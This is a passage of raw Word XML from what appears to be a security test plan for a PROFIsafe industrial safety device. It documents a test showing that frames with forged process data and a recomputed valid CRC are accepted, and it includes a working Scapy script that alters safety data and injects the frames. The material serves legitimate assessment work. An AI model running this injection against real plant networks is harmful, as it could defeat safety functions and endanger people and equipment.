              <w:pStyle w:val="KeinLeerraum"/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AB9FE" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A7A5AAA" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="1E93C90C">
          <v:rect id="_x0000_i1036" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F4D3D9" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ002-03 — Valid-CRC Injection over Modified Process Data (G-1 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556FE620" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16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7754"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="560FD2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DC3F9A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80D8F3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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="219B5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EF5C6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77DA1" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TC-RQ002-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="3C1BF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1957E3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D8CB5" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>RQ-002 → CR 3.1(+RE1) → Asset C</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="6ADC9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682CD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4AEA3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Tampering</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (intentional)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="10990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43AFC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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A1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7A8F1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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>protocol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manipulation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="7872F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EC602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F0F18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 xml:space="preserve">Demonstrate the central residual risk of RQ-002: because the 4-byte CRC (CRC-Seed24/32) is a non-secret checksum, an attacker who modifies the process data </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and recomputes a matching CRC</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> produces a frame the F-Device </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cannot distinguish</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> from a legitimate one — protection against </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>accidental</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> but not </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>intentional</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> corruption.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="45664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58DC7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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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CEB94" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>1. Capture a legitimate cyclic frame; extract F-Parameters (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, seed). 2. Modify the payload. 3. </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Recompute the CRC</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> over the modified payload. </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">4. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>Inject</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>observe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qualifier</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>outputs</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="2310B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7010A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FA097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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = frame ACCEPTED</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (qualifier good, outputs follow injected data) → evidences </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; recorded as residual risk mitigated only by the environmental firewall assumption (SRIO-9402) and requiring a cryptographic-MAC upgrade. A device that </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>rejected</w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the valid-CRC frame indicates an undocumented check to investigate.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53586A44" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00690A16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690A16" w:rsidRPr="00690A16" w14:paraId="319E5D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F1A4F9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529802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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="4F555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70CB6C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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16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8B3C5" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>TC-RQ002-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="7FCB4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C2926D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81506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Pi eth0 = 192.168.0.100 side-inject; DUT 192.168.0.2; SPS 192.168.0.1; laptop mirror</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00CB35D8" w14:paraId="30414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44EF3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D59852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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Scapy</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> CRC routine (CRC-Seed24/32, 4-byte), Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="531AC70D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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45532952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# TC-RQ002-03 Valid-CRC-over-modified-data (proves accidental != intentional protection)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22650256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from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> import Ether, Raw, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sendp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rdpcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="18176507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IFACE="eth0"; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tmpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rdpcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ref.pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>")[0]; raw=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bytearray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tmpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[Raw].load)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548B7178" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="048CDDB7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def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>profisafe_crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(data: bytes, seed: int) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B227625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poly=0x1F4ACFB13; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=seed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641B39EA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for b in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0389A2FF" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ^= b&lt;&lt;24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523ED412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for _ in range(8):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5AA2A9" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=((</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>&lt;&lt;1)^poly) if (crc&amp;0x80000000) else (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;&lt;1); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>&amp;=0xFFFFFFFF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631F0B5A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return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3903735B" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="546D46F8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PD=slice(0,-4); SEED=0x00000000 # derive from GSD CRC-Seed24/32 + F-Parameters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F487AEC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raw[2]^=0x01 # modify safety process data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA09FFB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raw[-4:]=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>profisafe_crc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(bytes(raw[PD]),SEED).</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(4,"big") # recompute VALID CRC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F26178F" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sendp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Ether(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tmpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[Ether].</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>="02:aa:bb:cc:dd:ee", type=0x8892)/Raw(bytes(raw)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13628558" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=IFACE, count=300, inter=0.002)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A243E1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print("[+] injected modified frame WITH valid recomputed CRC")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D12F071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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Accepted (G-1 confirmed) ☐ Rejected (investigate) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC03_validcrc.pcapng, Pi log, PLC I/O trace, CRC-recompute source archived |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9F19DB" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Method note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> validate the CRC routine reproduces a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>legitimate</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> captured CRC bit-for-bit </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>before</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> modifying the payload, to make the acceptance result scientifically defensible. </w:t>
      </w:r>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[NIST Techn...Assessment | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="24AFDBAC" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="26949F10">
          <v:rect id="_x0000_i1037" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="098B2BA8" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
